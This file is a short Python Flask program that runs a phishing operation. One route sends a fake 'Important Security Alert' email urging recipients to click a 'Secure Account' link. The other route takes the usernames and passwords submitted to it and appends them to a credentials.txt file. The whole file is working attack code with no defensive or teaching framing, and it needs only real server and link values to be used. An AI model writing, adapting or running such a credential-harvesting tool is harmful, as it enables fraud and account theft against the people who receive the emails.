
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from flask import Flask, request

# Configure the Flask app
app = Flask(__name__)

@app.route('/phish', methods=['POST'])
def phish():
    # Get the target email from the request
    target_email = request.form['email']
    
    # Configure the phishing email
    msg = MIMEMultipart()
    msg['From'] = 'phishing@example.com'
    msg['To'] = target_email
    msg['Subject'] = 'Important Security Alert!'
    
    # Create the phishing email body
    body = '''
    <html>
    <body>
        <p>Dear User,</p>
        <p>We have detected suspicious activity on your account.</p>
        <p>Please click the link below to secure your account:</p>
        <a href="http://example.com/login">Secure Account</a>
        <p>If you did not initiate this action, please contact support immediately.</p>
    </body>
    </html>
    '''
    
    # Attach the phishing email body to the message
    msg.attach(MIMEText(body, 'html'))
    
    # Send the phishing email
    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login('phishing@example.com', 'password')
    server.sendmail('phishing@example.com', target_email, msg.as_string())
    server.quit()
    
    return 'Phishing email sent to: ' + target_email

@app.route('/login', methods=['GET'])
def login():
    # Capture the user's credentials
    username = request.args.get('username')
    password = request.args.get('password')
    
    # Log the captured credentials
    with open('credentials.txt', 'a') as file:
        file.write('Username: ' + username + '\n')
        file.write('Password: ' + password + '\n')
        file.write('------------------------\n')
    
    return 'Credentials captured!'

if __name__ == '__main__':
    app.run()